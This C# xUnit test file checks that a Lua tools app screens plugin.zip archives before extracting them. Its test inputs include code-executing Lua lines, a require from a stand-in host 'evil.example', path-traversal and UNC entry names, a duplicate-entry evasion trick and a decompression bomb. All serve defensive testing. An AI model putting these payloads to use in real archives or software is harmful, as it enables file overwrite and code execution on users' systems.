using System.IO;
using System.IO.Compression;
using System.Text;
using AwesomeAssertions;
using LuaToolsGui.Services;
using Xunit;

namespace LuaToolsGui.Tests;

/// <summary>
/// The gate between "plugin.zip verified" and "plugin.zip extracted into %AppData%".
///
/// <para>
/// <see cref="FixAnalyzerTests"/> covers the analyser itself. What is pinned HERE is the plugin flow's own
/// wiring of it, which is a separate thing that can regress on its own: that the screen runs at all (it did
/// not, before the audit — Fixes had the gate and Plugin silently did not), that it is given a real
/// destination root, and that a refusal comes back as a message rather than an exception.
/// </para>
///
/// <para>
/// The destination root is the part most easily broken by a well-meaning edit.
/// <see cref="FixAnalyzer.AnalyzeArchive"/> treats a null root as "entries are not extracted by path" and
/// skips containment and duplicate-destination checking entirely. Passing null would therefore leave the
/// call site looking correct while doing none of the work it exists for, so the escape cases below are
/// what prove the root is really being handed over.
/// </para>
/// </summary>
public sealed class PluginArchiveScreeningTests : IDisposable
{
    private readonly string _tmp = Path.Combine(Path.GetTempPath(), $"pluginzip_{Guid.NewGuid():N}");
    private readonly string _dest;

    public PluginArchiveScreeningTests()
    {
        _dest = Path.Combine(_tmp, "plugin");
        Directory.CreateDirectory(_dest);
    }

    public void Dispose()
    {
        try { if (Directory.Exists(_tmp)) Directory.Delete(_tmp, recursive: true); } catch (IOException) { }
    }

    /// <summary>Build a zip from (entryName → content) pairs, writing entry names verbatim.</summary>
    private string MakeZip(params (string Name, string Content)[] entries)
    {
        string path = Path.Combine(_tmp, $"{Guid.NewGuid():N}.zip");
        using var fs = File.Create(path);
        using var zip = new ZipArchive(fs, ZipArchiveMode.Create);
        foreach (var (name, content) in entries)
        {
            using var stream = zip.CreateEntry(name).Open();
            stream.Write(Encoding.UTF8.GetBytes(content));
        }
        return path;
    }

    private string Screen(string zipPath) => PluginInstallerService.ScreenPluginArchive(zipPath, _dest)!;

    // ══ Happy path ═════════════════════════════════════════════════════════════

    [Fact]
    public void A_real_plugin_layout_is_accepted()
    {
        // The shape the installer expects: public/luatools.js plus supporting files.
        string zip = MakeZip(
            ("public/luatools.js", "export const init = () => {};"),
            ("public/styles.css", "body{}"),
            ("package.json", "{\"name\":\"luatools\"}"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should()
            .BeNull("a legitimate release must install — over-blocking here breaks the Plugin page outright");
    }

    [Fact]
    public void A_wrapped_single_folder_layout_is_accepted()
    {
        // plugin.zip sometimes wraps everything in one top-level folder; NormalizeFrontendLayout hoists it
        // afterwards, so the screen must not object to the nesting.
        string zip = MakeZip(
            ("luatools-plugin/public/luatools.js", "export {};"),
            ("luatools-plugin/README.md", "# plugin"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    // ══ Lua in a plugin is a PROGRAM, not a Steam manifest ═════════════════════
    // 1.4.0 screened plugin.zip with the manifest rules, so installing BetterSteamTools failed with
    // "backend/main.lua: the lua contains 'require', which a Steam manifest never needs". These pin the
    // profile actually being passed — dropping the argument silently restores the manifest rules and
    // breaks every plugin that ships Lua.

    [Fact]
    public void A_plugin_backend_using_require_is_accepted()
    {
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("backend/main.lua", "local utils = require(\"utils\")\nreturn { start = utils.start }"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should()
            .BeNull("this is the exact archive shape that was refused in 1.4.0");
    }

    [Fact]
    public void A_plugin_backend_using_ordinary_lua_is_accepted()
    {
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("backend/main.lua", """
                local json = require("json")
                local M = setmetatable({}, { __index = require("base") })
                function M.load(path)
                    local ok, data = pcall(function()
                        local f = io.open(path, "r")
                        return f and json.decode(f:read("*a")) or nil
                    end)
                    return ok and data or nil
                end
                return M
                """));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    [Theory]
    [InlineData("os.execute(\"calc.exe\")")]
    [InlineData("local h = io.popen(\"whoami\")")]
    [InlineData("loadstring(payload)()")]
    [InlineData("require(\"https://evil.example/mod.lua\")")]
    public void A_plugin_backend_that_executes_code_is_still_refused(string lua)
    {
        string zip = MakeZip(("public/luatools.js", "export {};"), ("backend/main.lua", lua));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().NotBeNull();
    }

    // ══ Malicious ══════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("../../../evil.js")]
    [InlineData("public/../../../../evil.js")]
    [InlineData("..\\..\\Windows\\System32\\evil.dll")]
    public void Path_traversal_is_refused(string entryName)
    {
        string zip = MakeZip((entryName, "payload"));

        Screen(zip).Should().Contain("escapes");
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\evil.dll")]
    [InlineData(@"\\attacker-share\evil.dll")]
    [InlineData(@"\evil.dll")]
    public void An_absolute_or_unc_entry_is_refused(string entryName)
    {
        // Path.Combine returns its second argument outright when that argument is rooted, which is how a
        // rooted entry name used to write wherever it liked.
        string zip = MakeZip((entryName, "payload"));

        Screen(zip).Should().Contain("absolute path");
    }

    [Fact]
    public void Two_entries_resolving_to_the_same_file_are_refused()
    {
        // Known analyser-evasion trick: the checker inspects one entry, the extractor's last write wins
        // with the other.
        string zip = MakeZip(
            ("public/luatools.js", "harmless"),
            ("public/./luatools.js", "payload"));

        Screen(zip).Should().Contain("same destination");
    }

    [Fact]
    public void A_decompression_bomb_is_refused()
    {
        // Above the 50 MB ratio floor and wildly compressible — the case ZipFile.ExtractToDirectory would
        // happily expand into %AppData%, because it guards paths and never size. Written in blocks rather
        // than one allocation so the test does not become the memory hog it is testing for.
        string path = Path.Combine(_tmp, "bomb.zip");
        using (var fs = File.Create(path))
        using (var zip = new ZipArchive(fs, ZipArchiveMode.Create))
        {
            using var stream = zip.CreateEntry("public/luatools.js").Open();
            byte[] block = Encoding.ASCII.GetBytes(new string('A', 1024 * 1024));
            for (int i = 0; i < 80; i++) stream.Write(block);
        }

        Screen(path).Should().Contain("decompression bomb");
    }

    [Fact]
    public void An_unreadable_archive_is_refused()
    {
        string notAZip = Path.Combine(_tmp, "corrupt.zip");
        File.WriteAllText(notAZip, "this is not a zip file");

        Screen(notAZip).Should().Contain("could not be read",
            "something that cannot be inspected must not be extracted");
    }

    // ══ False positives ════════════════════════════════════════════════════════

    [Fact]
    public void A_zip_carrying_executables_is_still_accepted()
    {
        // The plugin release genuinely ships binaries alongside the frontend. FixAnalyzer records
        // executable content as a note, never a block — if that ever flips, every plugin install breaks.
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("winmm.dll", "MZ binary-ish"),
            ("tools/helper.exe", "MZ binary-ish"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    [Fact]
    public void A_nested_archive_is_recorded_but_not_blocked()
    {
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("assets/icons.zip", "PK-ish"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    [Fact]
    public void A_small_highly_compressible_file_is_not_mistaken_for_a_bomb()
    {
        // The ratio rule only applies above a size floor, precisely so ordinary compressible assets pass.
        string zip = MakeZip(("public/luatools.js", new string('x', 64 * 1024)));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    // ══ Refusal shape ══════════════════════════════════════════════════════════

    [Fact]
    public void A_refusal_names_the_asset_and_the_reason()
    {
        string zip = MakeZip((@"C:\Windows\evil.dll", "payload"));

        Screen(zip).Should().Contain("plugin.zip").And.Contain("absolute path");
    }

    [Fact]
    public void Screening_reports_rather_than_throws_for_a_missing_file() =>
        PluginInstallerService.ScreenPluginArchive(Path.Combine(_tmp, "absent.zip"), _dest)
            .Should().NotBeNull("a missing staged file is a refusal, not an unhandled exception");
}
